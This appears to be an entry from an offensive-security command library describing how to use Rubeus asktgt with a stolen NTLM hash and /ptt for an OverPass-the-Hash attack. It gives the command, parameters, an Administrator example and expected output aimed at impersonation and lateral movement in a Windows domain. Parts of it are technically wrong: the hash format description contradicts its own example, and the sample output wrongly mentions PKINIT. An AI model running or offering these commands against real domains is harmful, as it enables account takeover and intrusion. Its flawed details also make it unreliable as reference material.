---
id: e6626698-61ec-40f3-829c-22253674d843
name: rubeus-asktgt-request-tgt-with-rc4-ntlm-hash
type: command
executor: cmd
data: '.\Rubeus.exe asktgt /user:$_USERNAME /rc4:$_NTLM_HASH /ptt'
output: null
created_at: '2023-04-06T03:56:05.155113+00:00'
updated_at: '2023-04-10T20:26:24.177808+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - pass-the-hash
verified: true
validated: true
---

# rubeus-asktgt-request-tgt-with-rc4-ntlm-hash

## Command

```cmd
.\Rubeus.exe asktgt /user:$_USERNAME /rc4:$_NTLM_HASH /ptt
```

## Description

This command uses Rubeus to request a Kerberos TGT for a specified domain user using their NTLM (RC4) hash and injects it directly into the current logon session (/ptt) for immediate impersonation. It is used in OverPass-the-Hash attacks to authenticate without the plaintext password, enabling lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target domain username (e.g., Administrator) | Yes |
| /rc4:$_NTLM_HASH | NTLM hash in hex format (32 characters for LM/NT parts combined) | Yes |
| /ptt | Pass-the-ticket: Injects the TGT into the current session | Yes |
| /domain:$_DOMAIN | Optional: Specify domain if not current (e.g., /domain:corp.local) | No |

## Examples

### Basic Usage

```cmd
.\Rubeus.exe asktgt /user:Administrator /rc4:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

### Advanced Usage

```cmd
.\Rubeus.exe asktgt /user:svc-account /rc4:$_NTLM_HASH /ptt /domain:example.com
```

## Expected Output

Successful execution produces output like:

```
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and realm: CORP.LOCAL
[+] Requesting TGT for user 'CORP\Administrator'...
[+] Received a valid TGT from the KDC
[+] Tickets successfully injected into memory
[+] Action success!
```

Verify with `klist` to see the injected ticket. Errors include KDC_ERR_PREAUTH_FAILED if the hash is invalid.

## Related

- [[procedures/OverPass-the-Hash-with-Rubeus]]
- [[tools/Rubeus]]
